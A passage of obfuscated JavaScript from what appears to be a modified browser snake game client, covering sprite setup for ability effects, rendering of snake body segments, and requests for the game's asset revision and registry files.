          var _0x5e388d = _0x4c43f1.length > 0 ? _0x4c43f1[_0x4d292f % _0x4c43f1.length] : 0;
          var _0x2439a2 = _0x328573.length > 0 ? _0x328573[_0x4d292f % _0x328573.length] : 0;
          var _0x543af9 = _0x5921b6.length > 0 ? _0x5921b6[_0x4d292f % _0x5921b6.length] : 0;
          _0x3de2ec.push(new _0x7f096e.Sb(_0xf46f7d, _0xff09f4, _0x5e388d, _0x2439a2, _0x543af9));
        }
        ;
        return _0x3de2ec;
      };
      _0x3592c0.prototype.Tb = function (_0x246f87) {
        if (this.wb.hasOwnProperty(_0x246f87)) {
          return this.wb[_0x246f87];
        } else {
          return this.xb;
        }
      };
      _0x3592c0.prototype.Ub = function (_0x2649bf) {
        if (this.yb.hasOwnProperty(_0x2649bf)) {
          return this.yb[_0x2649bf];
        } else {
          return this.zb;
        }
      };
      _0x3592c0.prototype.Vb = function (_0x1072ec) {
        if (this.Ab.hasOwnProperty(_0x1072ec)) {
          return this.Ab[_0x1072ec];
        } else {
          return this.Bb;
        }
      };
      _0x3592c0.prototype.Wb = function (_0x1345dd) {
        if (this.Cb.hasOwnProperty(_0x1345dd)) {
          return this.Cb[_0x1345dd];
        } else {
          return this.Db;
        }
      };
      _0x3592c0.prototype.Xb = function (_0x3c2600) {
        if (this.Gb.hasOwnProperty(_0x3c2600)) {
          return this.Gb[_0x3c2600];
        } else {
          return this.Hb;
        }
      };
      _0x3592c0.prototype.Yb = function (_0x47ebb0) {
        if (this.Eb.hasOwnProperty(_0x47ebb0)) {
          return this.Eb[_0x47ebb0];
        } else {
          return this.Fb;
        }
      };
      _0x3592c0.prototype.Zb = function (_0x5a1991) {
        if (this.sb.hasOwnProperty(_0x5a1991)) {
          return this.sb[_0x5a1991];
        } else {
          return this.tb;
        }
      };
      _0x3592c0.prototype.$b = function (_0x5af591) {
        if (this.ub.hasOwnProperty(_0x5af591)) {
          return this.ub[_0x5af591];
        } else {
          return this.vb;
        }
      };
      _0x3592c0.Nb = function _0x248b50(_0x185e18, _0x2fa4be, _0x3e146e) {
        this._b = _0x185e18;
        this.ac = _0x2fa4be;
        this.bc = _0x3e146e;
      };
      _0x3592c0.Lb = function _0x1faa96(_0x167714, _0x348561, _0x1d0acf) {
        this.cc = _0x167714;
        this.dc = _0x348561;
        this.ec = _0x1d0acf;
      };
      _0x3592c0.Ob = function _0x514906(_0x19e483) {
        this.dc = _0x19e483;
      };
      _0x3592c0.Ib = function _0x4bebc1(_0x1378b0, _0x42ea28) {
        this.dc = _0x1378b0;
        this.ec = _0x42ea28;
      };
      _0x3592c0.Mb = function _0x180fe4(_0x341382) {
        this.dc = _0x341382;
      };
      return _0x3592c0;
    }();
    _0x7f096e.Kb = function () {
      function _0x26d05a() {
        var _0x2a4c30 = _0x4ead11.k.m.from("/images/wear-ability.png");
        this.fc = new _0x7f096e.Wa("magnet_ability", _0x2a4c30, 158, 86, 67, 124, 148, 63.5, 128, 128);
        this.gc = new _0x7f096e.Wa("velocity_ability", _0x2a4c30, 158, 4, 87, 74, 203, 63.5, 128, 128);
        this.hc = new _0x7f096e.Wa("flex_ability", _0x2a4c30, 4, 4, 146, 146, 63.5, 63.5, 128, 128);
        var _0x33e01f = _0x4ead11.k.m.from(atob(_0x56e2a2[35]));
        this.pwrFlex1 = new _0x7f096e.Wa("flex_ability", _0x33e01f, 158, 4, 87, 74, 203, 63.5, 128, 128);
        var _0x40078e = _0x4ead11.k.m.from(atob(_0x56e2a2[68]));
        this.pwrFlex = new _0x7f096e.Wa("flex_ability", _0x40078e, 156, 140, 87, 60, 170, 128.5, 128, 128);
        this.pwrFlex2 = new _0x7f096e.Wa("flex_ability2", _0x40078e, 156, 4, 87, 74, 285, 63.5, 128, 128);
        var _0x522c30;
        var _0xe75731 = _0x4ead11.k.m.from("/images/def-look.png");
        var _0x31a3b5 = new _0x7f096e.Wa("def_eyes", _0xe75731, 0, 0, 42, 80, 75, 64, 128, 128);
        var _0x13e08c = new _0x7f096e.Wa("def_mouth", _0xe75731, 46, 0, 20, 48, 109, 63, 128, 128);
        var _0x2644f8 = new _0x7f096e.Wa("def_skin_glow", _0xe75731, 70, 0, 32, 32, 0, 0, 0, 0);
        var _0x183ef8 = new _0x7f096e.Wa("def_skin_base", _0xe75731, 46, 52, 64, 64, 0, 0, 0, 0);
        var _0x2a9d0c = _0x7f096e.pb.Pb(_0x183ef8, _0x2644f8, _0x31a3b5, _0x13e08c);
        this.ic = new _0x7f096e.jc({}, _0x2a9d0c);
        this.kc = -10000;
        this.lc = -10000;
        this.mc = ((_0x522c30 = _0x7f096e.c.document.createElement("canvas")).width = 80, _0x522c30.height = 80, {
          nc: _0x522c30,
          oc: _0x522c30.getContext("2d"),
          Za: new _0x4ead11.k.n(_0x4ead11.k.m.from(_0x522c30))
        });
        this.pc = null;
        this.qc = [];
      }
      _0x26d05a.Jb = _0x7f096e.Wa.lb();
      _0x26d05a.prototype.Sa = function () {};
      _0x26d05a.prototype.rc = function (_0x5e6cac, _0x1c7135, _0x359c5d) {
        var _0xea2257 = this;
        var _0x3a9b07 = this.ic.sc();
        if (_0x3a9b07 > 0 && _0x331039.Ca() - this.kc < 1200000) {
          if (_0x5e6cac != null) {
            _0x5e6cac();
          }
          return;
        }
        ;
        if (this.pc != null && !this.pc.tc()) {
          if (_0x331039.Ca() - this.kc < 300000) {
            if (_0x5e6cac != null) {
              _0x5e6cac();
            }
            return;
          }
          ;
          this.pc.uc();
          this.pc = null;
        }
        ;
        var _0x519f1c = new _0x7f096e.vc(_0x3a9b07);
        _0x519f1c.wc(function (_0x702cc9, _0x5153e8) {
          if (_0x519f1c === _0xea2257.pc && _0x359c5d != null) {
            _0x359c5d(_0x702cc9, _0x5153e8);
          }
        });
        _0x519f1c.xc(function (_0x1a4823) {
          if (_0x519f1c === _0xea2257.pc && _0x1c7135 != null) {
            _0x1c7135(_0x1a4823);
          }
        });
        _0x519f1c.yc(function () {
          if (_0x519f1c === _0xea2257.pc && _0x1c7135 != null) {
            _0x1c7135(Error());
          }
        });
        _0x519f1c.zc(function () {
          if (_0x519f1c === _0xea2257.pc && _0x5e6cac != null) {
            _0x5e6cac();
          }
        });
        _0x519f1c.Ac(function (_0x37602b) {
          if (_0x519f1c === _0xea2257.pc) {
            _0xea2257.lc = _0x331039.Ca();
            _0xea2257.pc = null;
            _0xea2257.Bc();
            _0xea2257.ic.Cc().ob();
            _0xea2257.ic = _0x37602b;
            if (_0x5e6cac != null) {
              _0x5e6cac();
            }
            _0xea2257.Dc();
            return;
          }
          ;
          try {
            _0x37602b.Cc().ob();
          } catch (_0x2f1a11) {}
        });
        _0x519f1c.Ec();
        this.kc = _0x331039.Ca();
        this.pc = _0x519f1c;
      };
      _0x26d05a.prototype.Bc = function () {};
      _0x26d05a.prototype.Fc = function () {
        return this.ic.sc() > 0;
      };
      _0x26d05a.prototype.Gc = function () {
        return this.ic.Hc();
      };
      _0x26d05a.prototype.Ic = function () {
        return this.mc;
      };
      _0x26d05a.prototype.Jc = function (_0x24dadf) {
        this.qc.push(_0x24dadf);
      };
      _0x26d05a.prototype.Dc = function () {
        for (var _0x8640d2 = 0; _0x8640d2 < this.qc.length; _0x8640d2++) {
          this.qc[_0x8640d2]();
        }
      };
      _0x26d05a.prototype.Cc = function () {
        return this.ic.Cc();
      };
      return _0x26d05a;
    }();
    _0x7f096e.Kc = function () {
      function _0x282d60(_0x3df937) {
        this.Lc = _0x3df937;
      }
      _0x282d60.prototype.Mc = function (_0x4c70c5) {
        return this.Lc[_0x4c70c5];
      };
      _0x282d60.Nc = function () {
        function _0x33c5d4() {
          this.Oc = [];
        }
        _0x33c5d4.prototype.Pc = function (_0x2eb31f, _0x41c73d) {
          for (var _0x43233e = 0; _0x43233e < this.Oc.length; _0x43233e++) {
            if (this.Oc[_0x43233e].Qc === _0x2eb31f) {
              throw Error();
            }
          }
          ;
          this.Oc.push(new _0x282d60.Rc(_0x2eb31f, _0x41c73d));
          return this;
        };
        _0x33c5d4.prototype.Sc = function () {
          var _0x347934 = 0;
          for (var _0x1831cd = 0; _0x1831cd < this.Oc.length; _0x1831cd++) {
            _0x347934 += this.Oc[_0x1831cd].Tc;
          }
          ;
          var _0x4e85b3 = {};
          var _0x4dbf3c = 0;
          for (var _0x42d2ac = 0; _0x42d2ac < this.Oc.length; _0x42d2ac++) {
            var _0x17fa87 = this.Oc[_0x42d2ac];
            _0x17fa87.Tc = _0x17fa87.Tc / _0x347934;
            _0x17fa87.Uc = _0x4dbf3c;
            _0x17fa87.Vc = _0x4dbf3c + _0x17fa87.Tc;
            _0x4dbf3c = _0x17fa87.Vc;
            _0x4e85b3[_0x17fa87.Qc] = _0x17fa87;
          }
          ;
          return new _0x282d60(_0x4e85b3);
        };
        return _0x33c5d4;
      }();
      _0x282d60.Rc = function () {
        function _0x115d6b(_0x1f84df, _0x241389) {
          this.Qc = _0x1f84df;
          this.Tc = _0x241389;
          this.Uc = 0;
          this.Vc = 0;
        }
        _0x115d6b.prototype.Wc = function (_0x36080d) {
          return this.Uc + (this.Vc - this.Uc) * _0x36080d;
        };
        return _0x115d6b;
      }();
      return _0x282d60;
    }();
    _0x7f096e.Xc = function () {
      function _0x2bf4ee() {
        this.Yc = new _0x4ead11.k.l();
        this.Yc.sortableChildren = true;
        this.Zc = new _0x43d0fb();
        this.Zc.zIndex = _0x4b8231 * ((_0x4956c3 + 1) * 2 + 1 + 3);
        this.$c = 0;
        this._c = Array(_0x4956c3);
        this._c[0] = this.ad(0, new _0x7f096e.bd(), new _0x7f096e.bd());
        for (var _0x51c021 = 1; _0x51c021 < _0x4956c3; _0x51c021++) {
          this._c[_0x51c021] = this.ad(_0x51c021, new _0x7f096e.bd(), new _0x7f096e.bd());
        }
        ;
        this.cd = 0;
        this.dd = 0;
        this.ed = 0;
      }
      var _0x3bd8e9;
      var _0x4b8231 = 0.001;
      var _0x4956c3 = 797;
      var _0x5002a2 = _0x494ea6.T * 0.1;
      _0x2bf4ee.fd = _0x4956c3;
      _0x2bf4ee.prototype.ad = function (_0x5175a0, _0x3c6433, _0x1ce744) {
        var _0x11a8b3 = new _0x59bb23(_0x3c6433, _0x1ce744);
        _0x3c6433.gd.zIndex = _0x4b8231 * ((_0x4956c3 - _0x5175a0) * 2 + 1 + 3);
        _0x1ce744.gd.zIndex = _0x4b8231 * ((_0x4956c3 - _0x5175a0) * 2 - 2 + 3);
        return _0x11a8b3;
      };
      _0x2bf4ee.prototype.hd = function (_0x392645, _0x941c38, _0xddfe2e, _0x48e5ea, _0x212e3e, _0x305532, _0x2157e, _0x37b02e) {
        var _0xa9e197 = _0xddfe2e.dc;
        var _0x3b868f = _0x392645 === _0x7f096e.jd.id ? _0x941c38.ac.ec : _0xddfe2e.ec;
        if (_0xa9e197.length > 0 && _0x3b868f.length > 0) {
          for (var _0xcd808b = 0; _0xcd808b < this._c.length; _0xcd808b++) {
            this._c[_0xcd808b].ld.kd(_0xa9e197[_0xcd808b % _0xa9e197.length]);
            this._c[_0xcd808b].md.kd(_0x3b868f[_0xcd808b % _0x3b868f.length]);
            this._c[_0xcd808b].ld.nd(_0x37b02e);
            this._c[_0xcd808b].md.nd(_0x37b02e);
          }
        }
        ;
        this.Zc.hd(_0x48e5ea, _0x212e3e, _0x305532, _0x2157e);
      };
      (_0x3bd8e9 = _0x331039.ca(_0x4ead11.k.l, function () {
        _0x4ead11.k.l.call(this);
        this.sortableChildren = true;
        this.od = [];
        this.pd = [];
        this.qd = [];
        this.rd = [];
        this.sd = new _0x4ead11.k.l();
        this.td = [];
        for (var _0x111b16 = 0; _0x111b16 < 4; _0x111b16++) {
          var _0xe085ec = new _0x7f096e.bd();
          _0xe085ec.kd(ooo.ud.fc);
          this.sd.addChild(_0xe085ec.gd);
          this.td.push(_0xe085ec);
        }
        ;
        this.sd.zIndex = 0.0011;
        this.addChild(this.sd);
        this.vd();
        this.wd = new _0x7f096e.bd();
        this.wd.kd(ooo.ud.gc);
        this.wd.gd.zIndex = 0.001;
        this.addChild(this.wd.gd);
        this.xd();
        this.pwr_flex1 = new _0x7f096e.bd();
        this.pwr_flex1.kd(ooo.ud.pwrFlex1);
        this.pwr_flex1.gd.zIndex = 0.002;
        this.addChild(this.pwr_flex1.gd);
        this.pwr_flex = new _0x7f096e.bd();
        this.pwr_flex.kd(ooo.ud.pwrFlex);
        this.pwr_flex.gd.zIndex = 0.001;
        this.addChild(this.pwr_flex.gd);
        this.pwr_flex2 = new _0x7f096e.bd();
        this.pwr_flex2.kd(ooo.ud.pwrFlex2);
        this.pwr_flex2.gd.zIndex = 0.001;
        this.addChild(this.pwr_flex2.gd);
        this.disableFlex();
      })).prototype.hd = function (_0x10fb8a, _0x41eaf6, _0x13c943, _0x1d5e7f) {
        this.yd(0.002, this.od, _0x10fb8a.dc);
        this.yd(0.003, this.pd, _0x41eaf6.dc);
        this.yd(0.004, this.rd, _0x1d5e7f.dc);
        this.yd(0.005, this.qd, _0x13c943.dc);
      };
      _0x3bd8e9.prototype.yd = function (_0x2f0091, _0x3ac4bf, _0x239332) {
        while (_0x239332.length > _0x3ac4bf.length) {
          var _0x12707f = new _0x7f096e.bd();
          _0x3ac4bf.push(_0x12707f);
          this.addChild(_0x12707f.zd());
        }
        ;
        while (_0x239332.length < _0x3ac4bf.length) {
          _0x3ac4bf.pop().G();
        }
        ;
        var _0x25ad96 = _0x2f0091;
        for (var _0x5963c1 = 0; _0x5963c1 < _0x239332.length; _0x5963c1++) {
          _0x25ad96 += 0.0001;
          var _0x2a75bd = _0x3ac4bf[_0x5963c1];
          _0x2a75bd.kd(_0x239332[_0x5963c1]);
          _0x2a75bd.gd.zIndex = _0x25ad96;
        }
      };
      _0x3bd8e9.prototype.Ad = function (_0x2c09e5, _0x2d7060, _0x4435a1, _0x16d5ce) {
        this.visible = true;
        this.position.set(_0x2c09e5, _0x2d7060);
        this.rotation = _0x16d5ce;
        for (var _0xbbb277 = 0; _0xbbb277 < this.od.length; _0xbbb277++) {
          this.od[_0xbbb277].Bd(_0x4435a1);
        }
        ;
        for (var _0x109093 = 0; _0x109093 < this.pd.length; _0x109093++) {
          this.pd[_0x109093].Bd(_0x4435a1);
        }
        ;
        for (var _0x3b8fb0 = 0; _0x3b8fb0 < this.qd.length; _0x3b8fb0++) {
          this.qd[_0x3b8fb0].Bd(_0x4435a1);
        }
        ;
        for (var _0x5f0d41 = 0; _0x5f0d41 < this.rd.length; _0x5f0d41++) {
          this.rd[_0x5f0d41].Bd(_0x4435a1);
        }
      };
      _0x3bd8e9.prototype.Cd = function () {
        this.visible = false;
      };
      _0x3bd8e9.prototype.Dd = function (_0x36cbc8, _0x2f0b0a, _0x165a70, _0x289ba2) {
        this.sd.visible = true;
        var _0x464e96 = _0x165a70 / 1000;
        var _0x56c57a = 1 / this.td.length;
        for (var _0x4491cf = 0; _0x4491cf < this.td.length; _0x4491cf++) {
          var _0x153be1 = 1 - (_0x464e96 + _0x56c57a * _0x4491cf) % 1;
          this.td[_0x4491cf].gd.alpha = 1 - _0x153be1;
          this.td[_0x4491cf].Bd(_0x2f0b0a * (0.5 + _0x153be1 * 4.5));
        }
      };
      _0x3bd8e9.prototype.vd = function () {
        this.sd.visible = false;
      };
      _0x3bd8e9.prototype.Ed = function (_0x2fa7df, _0x10ddef, _0x3ecc63, _0x5e81a5) {
        this.wd.gd.visible = _0x207b06.vp;
        this.wd.gd.alpha = _0x331039.ga(this.wd.gd.alpha, _0x2fa7df.Fd ? 0.9 : 0.4, _0x5e81a5, 0.0025);
        this.wd.Bd(_0x10ddef);
      };
      _0x3bd8e9.prototype.xd = function () {
        this.wd.gd.visible = false;
      };
      _0x3bd8e9.prototype.activeFlex = function (_0x52ed53, _0x582866, _0x519834, _0x1e1fb0) {
        this.pwr_flex1.gd.visible = _0x207b06.flx === 1;
        this.pwr_flex1.gd.alpha = _0x331039.ga(this.wd.gd.alpha, _0x52ed53.Fd ? 1 : 1, _0x1e1fb0, 1);
        this.pwr_flex1.Bd(_0x582866);
        this.pwr_flex.gd.visible = _0x207b06.flx === 2;
        this.pwr_flex.gd.alpha = _0x331039.ga(this.wd.gd.alpha, _0x52ed53.Fd ? 0.9 : 0.5, _0x1e1fb0, 0.0025);
        this.pwr_flex.Bd(_0x582866);
        this.pwr_flex2.gd.visible = _0x207b06.flx === 3;
        this.pwr_flex2.gd.alpha = _0x331039.ga(this.wd.gd.alpha, _0x52ed53.Fd ? 0.9 : 0.5, _0x1e1fb0, 0.0025);
        this.pwr_flex2.Bd(_0x582866);
      };
      _0x3bd8e9.prototype.disableFlex = function () {
        this.pwr_flex1.gd.visible = false;
        this.pwr_flex.gd.visible = false;
        this.pwr_flex2.gd.visible = false;
      };
      var _0x43d0fb = _0x3bd8e9;
      _0x2bf4ee.prototype.Gd = function (_0x2c5abc) {
        return this.dd + this.ed * _0x331039.oa(_0x2c5abc * _0x5002a2 - this.cd);
      };
      _0x2bf4ee.prototype.Hd = function (_0x1a68a8, _0x5485ec, _0x3b5e65, _0x4bc9a7) {
        var _0x1fe158;
        var _0x4d1c94;
        var _0x4f10e1;
        var _0x23b3b7;
        var _0x15948d;
        var _0x236971;
        var _0x489364;
        var _0x2f22b4;
        var _0x30bca3 = _0x1a68a8.Id * 2;
        var _0x473eaa = _0x1a68a8.Jd;
        var _0x4a6dcc = _0x1a68a8.Kd;
        var _0x20cfcb = _0x4a6dcc * 4 - 3;
        var _0xf836b1 = _0x20cfcb;
        this.cd = _0x5485ec / 400 * _0x494ea6.T;
        this.dd = _0x30bca3 * 1.5;
        this.ed = _0x30bca3 * 0.15 * _0x1a68a8.Ld;
        if (_0x4bc9a7(_0x4d1c94 = _0x473eaa[0], _0x236971 = _0x473eaa[1])) {
          _0x4f10e1 = _0x473eaa[2];
          _0x489364 = _0x473eaa[3];
          _0x23b3b7 = _0x473eaa[4];
          _0x2f22b4 = _0x473eaa[5];
          var _0x53dafe = _0x331039.ta(_0x2f22b4 + _0x236971 * 2 - _0x489364 * 3, _0x23b3b7 + _0x4d1c94 * 2 - _0x4f10e1 * 3);
          this.Zc.Ad(_0x4d1c94, _0x236971, _0x30bca3, _0x53dafe);
          this._c[0].Ad(_0x4d1c94, _0x236971, _0x30bca3, this.Gd(0), _0x53dafe);
          this._c[1].Ad(_0x4d1c94 * 0.64453125 + _0x4f10e1 * 0.45703125 + _0x23b3b7 * -0.1015625, _0x236971 * 0.64453125 + _0x489364 * 0.45703125 + _0x2f22b4 * -0.1015625, _0x30bca3, this.Gd(1), _0x59bb23.Md(this._c[0], this._c[2]));
          this._c[2].Ad(_0x4d1c94 * 0.375 + _0x4f10e1 * 0.75 + _0x23b3b7 * -0.125, _0x236971 * 0.375 + _0x489364 * 0.75 + _0x2f22b4 * -0.125, _0x30bca3, this.Gd(2), _0x59bb23.Md(this._c[1], this._c[3]));
          this._c[3].Ad(_0x4d1c94 * 0.15234375 + _0x4f10e1 * 0.94921875 + _0x23b3b7 * -0.1015625, _0x236971 * 0.15234375 + _0x489364 * 0.94921875 + _0x2f22b4 * -0.1015625, _0x30bca3, this.Gd(3), _0x59bb23.Md(this._c[2], this._c[4]));
        } else {
          this.Zc.Cd();
          this._c[0].Cd();
          this._c[1].Cd();
          this._c[2].Cd();
          this._c[3].Cd();
        }
        ;
        var _0x2c6105 = 4;
        for (var _0x387981 = 2, _0x7ed1b5 = _0x4a6dcc * 2 - 4; _0x387981 < _0x7ed1b5; _0x387981 += 2) {
          if (_0x4bc9a7(_0x4d1c94 = _0x473eaa[_0x387981], _0x236971 = _0x473eaa[_0x387981 + 1])) {
            _0x1fe158 = _0x473eaa[_0x387981 - 2];
            _0x15948d = _0x473eaa[_0x387981 - 1];
            _0x4f10e1 = _0x473eaa[_0x387981 + 2];
            _0x489364 = _0x473eaa[_0x387981 + 3];
            _0x23b3b7 = _0x473eaa[_0x387981 + 4];
            _0x2f22b4 = _0x473eaa[_0x387981 + 5];
            this._c[_0x2c6105].Ad(_0x4d1c94, _0x236971, _0x30bca3, this.Gd(_0x2c6105), _0x59bb23.Md(this._c[_0x2c6105 - 1], this._c[_0x2c6105 + 1]));
            _0x2c6105++;
            this._c[_0x2c6105].Ad(_0x1fe158 * -0.06640625 + _0x4d1c94 * 0.84375 + _0x4f10e1 * 0.2578125 + _0x23b3b7 * -0.03515625, _0x15948d * -0.06640625 + _0x236971 * 0.84375 + _0x489364 * 0.2578125 + _0x2f22b4 * -0.03515625, _0x30bca3, this.Gd(_0x2c6105), _0x59bb23.Md(this._c[_0x2c6105 - 1], this._c[_0x2c6105 + 1]));
            _0x2c6105++;
            this._c[_0x2c6105].Ad(_0x1fe158 * -0.0625 + _0x4d1c94 * 0.5625 + _0x4f10e1 * 0.5625 + _0x23b3b7 * -0.0625, _0x15948d * -0.0625 + _0x236971 * 0.5625 + _0x489364 * 0.5625 + _0x2f22b4 * -0.0625, _0x30bca3, this.Gd(_0x2c6105), _0x59bb23.Md(this._c[_0x2c6105 - 1], this._c[_0x2c6105 + 1]));
            _0x2c6105++;
            this._c[_0x2c6105].Ad(_0x1fe158 * -0.03515625 + _0x4d1c94 * 0.2578125 + _0x4f10e1 * 0.84375 + _0x23b3b7 * -0.06640625, _0x15948d * -0.03515625 + _0x236971 * 0.2578125 + _0x489364 * 0.84375 + _0x2f22b4 * -0.06640625, _0x30bca3, this.Gd(_0x2c6105), _0x59bb23.Md(this._c[_0x2c6105 - 1], this._c[_0x2c6105 + 1]));
            _0x2c6105++;
          } else {
            this._c[_0x2c6105].Cd();
            _0x2c6105++;
            this._c[_0x2c6105].Cd();
            _0x2c6105++;
            this._c[_0x2c6105].Cd();
            _0x2c6105++;
            this._c[_0x2c6105].Cd();
            _0x2c6105++;
          }
        }
        ;
        if (_0x4bc9a7(_0x4d1c94 = _0x473eaa[_0x4a6dcc * 2 - 4], _0x236971 = _0x473eaa[_0x4a6dcc * 2 - 3])) {
          _0x1fe158 = _0x473eaa[_0x4a6dcc * 2 - 6];
          _0x15948d = _0x473eaa[_0x4a6dcc * 2 - 5];
          _0x4f10e1 = _0x473eaa[_0x4a6dcc * 2 - 2];
          _0x489364 = _0x473eaa[_0x4a6dcc * 2 - 1];
          this._c[_0x20cfcb - 5].Ad(_0x4d1c94, _0x236971, _0x30bca3, this.Gd(_0x20cfcb - 5), _0x59bb23.Md(this._c[_0x20cfcb - 6], this._c[_0x20cfcb - 4]));
          this._c[_0x20cfcb - 4].Ad(_0x1fe158 * -0.1015625 + _0x4d1c94 * 0.94921875 + _0x4f10e1 * 0.15234375, _0x15948d * -0.1015625 + _0x236971 * 0.94921875 + _0x489364 * 0.15234375, _0x30bca3, this.Gd(_0x20cfcb - 4), _0x59bb23.Md(this._c[_0x20cfcb - 5], this._c[_0x20cfcb - 3]));
          this._c[_0x20cfcb - 3].Ad(_0x1fe158 * -0.125 + _0x4d1c94 * 0.75 + _0x4f10e1 * 0.375, _0x15948d * -0.125 + _0x236971 * 0.75 + _0x489364 * 0.375, _0x30bca3, this.Gd(_0x20cfcb - 3), _0x59bb23.Md(this._c[_0x20cfcb - 4], this._c[_0x20cfcb - 2]));
          this._c[_0x20cfcb - 2].Ad(_0x1fe158 * -0.1015625 + _0x4d1c94 * 0.45703125 + _0x4f10e1 * 0.64453125, _0x15948d * -0.1015625 + _0x236971 * 0.45703125 + _0x489364 * 0.64453125, _0x30bca3, this.Gd(_0x20cfcb - 2), _0x59bb23.Md(this._c[_0x20cfcb - 3], this._c[_0x20cfcb - 1]));
          this._c[_0x20cfcb - 1].Ad(_0x4f10e1, _0x489364, _0x30bca3, this.Gd(_0x20cfcb - 1), _0x59bb23.Md(this._c[_0x20cfcb - 2], this._c[_0x20cfcb - 1]));
        } else {
          this._c[_0x20cfcb - 5].Cd();
          this._c[_0x20cfcb - 4].Cd();
          this._c[_0x20cfcb - 3].Cd();
          this._c[_0x20cfcb - 2].Cd();
          this._c[_0x20cfcb - 1].Cd();
        }
        if (this.$c === 0 && _0xf836b1 > 0) {
          this.Yc.addChild(this.Zc);
        }
        if (this.$c > 0 && _0xf836b1 === 0) {
          _0x4ead11.k.F.G(this.Zc);
        }
        while (this.$c < _0xf836b1) {
          this.Yc.addChild(this._c[this.$c].ld.zd());
          this.Yc.addChild(this._c[this.$c].md.zd());
          this.$c += 1;
        }
        ;
        while (this.$c > _0xf836b1) {
          this.$c -= 1;
          this._c[this.$c].md.G();
          this._c[this.$c].ld.G();
        }
        ;
        var _0x4a9c63 = _0x1a68a8.Nd[_0x7f096e.Pd.Od];
        if (this._c[0].Qd() && _0x4a9c63 != null && _0x4a9c63.Rd) {
          this.Zc.Dd(_0x1a68a8, _0x30bca3, _0x5485ec, _0x3b5e65);
        } else {
          this.Zc.vd();
        }
        var _0x3dc83d = _0x1a68a8.Nd[_0x7f096e.Pd.Sd];
        if (this._c[0].Qd() && _0x3dc83d != null && _0x3dc83d.Rd) {
          this.Zc.Ed(_0x1a68a8, _0x30bca3, _0x5485ec, _0x3b5e65);
        } else {
          this.Zc.xd();
        }
        var _0x2efa63 = _0x1a68a8.Nd[_0x7f096e.Pd.Yd];
        if (this._c[0].Qd() && _0x2efa63 != null && _0x2efa63.Rd) {
          this.Zc.activeFlex(_0x1a68a8, _0x30bca3, _0x5485ec, _0x3b5e65);
        } else {
          this.Zc.disableFlex();
        }
      };
      var _0x59bb23 = function () {
        function _0x1aa875(_0x20dfad, _0x3d6449) {
          this.ld = _0x20dfad;
          this.ld.Td(false);
          this.md = _0x3d6449;
          this.md.Td(false);
        }
        _0x1aa875.prototype.Ad = function (_0x3f7a4d, _0x218210, _0x1c4e5a, _0x183cda, _0x354ae2) {
          this.ld.Td(true);
          this.ld.Ud(_0x3f7a4d, _0x218210);
          this.ld.Bd(_0x1c4e5a);
          this.ld.Vd(_0x354ae2);
          this.md.Td(true);
          this.md.Ud(_0x3f7a4d, _0x218210);
          this.md.Bd(_0x183cda);
          this.md.Vd(_0x354ae2);
        };
        _0x1aa875.prototype.Cd = function () {
          this.ld.Td(false);
          this.md.Td(false);
        };
        _0x1aa875.prototype.Qd = function () {
          return this.ld.Qd();
        };
        _0x1aa875.Md = function (_0x8a551d, _0x4cedf9) {
          return _0x331039.ta(_0x8a551d.ld.gd.position.y - _0x4cedf9.ld.gd.position.y, _0x8a551d.ld.gd.position.x - _0x4cedf9.ld.gd.position.x);
        };
        return _0x1aa875;
      }();
      return _0x2bf4ee;
    }();
    _0x7f096e.Pd = function () {
      function _0x96e5a6(_0x366e88) {
        this.Wd = _0x366e88;
        this.Rd = false;
        this.Xd = 1;
      }
      _0x96e5a6.Sd = 0;
      _0x96e5a6.Yd = 1;
      _0x96e5a6.Od = 2;
      _0x96e5a6.Zd = 6;
      _0x96e5a6.$d = 3;
      _0x96e5a6._d = 4;
      _0x96e5a6.ae = 5;
      return _0x96e5a6;
    }();
    _0x7f096e.jc = function () {
      function _0x2bf392(_0x4c99f9, _0x45b5db) {
        this.be = _0x4c99f9;
        this.ce = _0x45b5db;
      }
      _0x2bf392.de = new _0x2bf392({}, _0x7f096e.pb.lb());
      _0x2bf392.prototype.sc = function () {
        return this.be.revision;
      };
      _0x2bf392.prototype.Hc = function () {
        return this.be;
      };
      _0x2bf392.prototype.Cc = function () {
        return this.ce;
      };
      return _0x2bf392;
    }();
    _0x7f096e.vc = function () {
      function _0x304977(_0x403556) {
        this.ee = (++_0x304977.fe, function (_0x2905b7, _0x3ceeab) {});
        this.ge = _0x403556;
        this.he = null;
        this.ie = null;
        this.je = null;
        this.ke = null;
        this.le = null;
        this.me = false;
        this.ne = false;
        this.oe = false;
      }
      _0x304977.pe = {
        qe: "0x0",
        re: "0x1",
        se: "0x2",
        te: "0x3",
        ue: "0x4"
      };
      _0x304977.fe = 100000;
      _0x304977.ve = new _0x7f096e.Kc.Nc().Pc(_0x304977.pe.qe, 1).Pc(_0x304977.pe.re, 10).Pc(_0x304977.pe.se, 50).Pc(_0x304977.pe.te, 15).Pc(_0x304977.pe.ue, 5).Sc();
      _0x304977.prototype.Ac = function (_0x446ebe) {
        this.he = _0x446ebe;
      };
      _0x304977.prototype.zc = function (_0x29d048) {
        this.ie = _0x29d048;
      };
      _0x304977.prototype.xc = function (_0x2b8138) {
        this.je = _0x2b8138;
      };
      _0x304977.prototype.yc = function (_0x4bab2b) {
        this.ke = _0x4bab2b;
      };
      _0x304977.prototype.wc = function (_0xbbf004) {
        this.le = _0xbbf004;
      };
      _0x304977.prototype.tc = function () {
        return this.oe;
      };
      _0x304977.prototype.uc = function () {
        this.me = true;
      };
      _0x304977.prototype.Ec = function () {
        if (!this.ne) {
          this.ne = true;
          if (this.me) {
            this.we();
            return;
          }
          ;
          this.xe();
        }
      };
      _0x304977.prototype.xe = function () {
        var _0x188bff = this;
        if (this.me) {
          this.we();
          return;
        }
        ;
        $.ajax({
          type: "GET",
          url: _0x494ea6.H.K + "/dynamic/assets/revision.json",
          xhrFields: {
            onprogress: function (_0xc13db2) {
              var _0x30ba16;
              var _0x42a1ef;
              if (_0xc13db2.lengthComputable) {
                _0x30ba16 = _0xc13db2.loaded / _0xc13db2.total;
                _0x42a1ef = _0x304977.pe.qe;
                _0x188bff.ye(_0x42a1ef, _0x304977.ve.Mc(_0x42a1ef).Wc(_0x30ba16));
              }
            }
          }
        }).fail(function () {
          _0x188bff.ze(Error());
        }).done(function (_0x188cef) {
          if (_0x188cef <= _0x188bff.ge) {
            _0x188bff.Ae();
            return;
          }
          ;
          _0x188bff.Be();
        });
      };
      _0x304977.prototype.Be = function () {
        var _0x19a1b1 = this;
        if (this.me) {
          this.we();
          return;
        }
        ;
        $.ajax({
          type: "GET",
          url: _0x494ea6.H.K + "/dynamic/assets/registry.json",
          xhrFields: {
